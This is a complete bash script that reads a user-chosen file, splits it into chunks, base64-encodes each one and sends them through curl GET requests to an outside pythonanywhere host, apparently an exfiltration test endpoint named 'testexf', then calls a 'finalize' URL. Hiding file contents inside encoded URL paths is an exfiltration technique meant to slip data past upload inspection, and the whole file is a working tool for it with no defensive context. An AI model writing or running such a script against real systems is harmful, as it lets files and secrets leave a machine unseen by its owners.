#!/bin/bash

# Config
SERVER_URL="https://shkgiri.pythonanywhere.com/testexf"
FINALIZE_URL="https://shkgiri.pythonanywhere.com/finalize"
CHUNK_SIZE=1000  # characters

# Input from user
read -p "Enter file path to upload: " FILE_PATH
read -p "Enter a unique ID for this upload: " UNIQUE_ID

# Check if file exists
if [ ! -f "$FILE_PATH" ]; then
    echo "❌ File not found!"
    exit 1
fi

# Read the file content
FILE_CONTENT=$(<"$FILE_PATH")

# Total length
TOTAL_LENGTH=${#FILE_CONTENT}
NUM_CHUNKS=$(( (TOTAL_LENGTH + CHUNK_SIZE - 1) / CHUNK_SIZE ))

# Send chunks
echo "🚀 Sending $NUM_CHUNKS chunks..."
for (( i=0; i<$NUM_CHUNKS; i++ )); do
    OFFSET=$((i * CHUNK_SIZE))
    CHUNK="${FILE_CONTENT:$OFFSET:$CHUNK_SIZE}"
    DATA="$UNIQUE_ID:$CHUNK"
    
    # base64 encode and URL-safe encoding
    ENCODED=$(echo -n "$DATA" | base64 | tr '+/' '-_' | tr -d '=')
    
    # Send via GET
    curl -s -G "$SERVER_URL/$ENCODED" > /dev/null
    echo "✅ Chunk $((i + 1))/$NUM_CHUNKS sent"
done

# Finalize
FINALIZE_RESPONSE=$(curl -s -G "$FINALIZE_URL/$UNIQUE_ID")
echo "📁 Finalize response: $FINALIZE_RESPONSE"
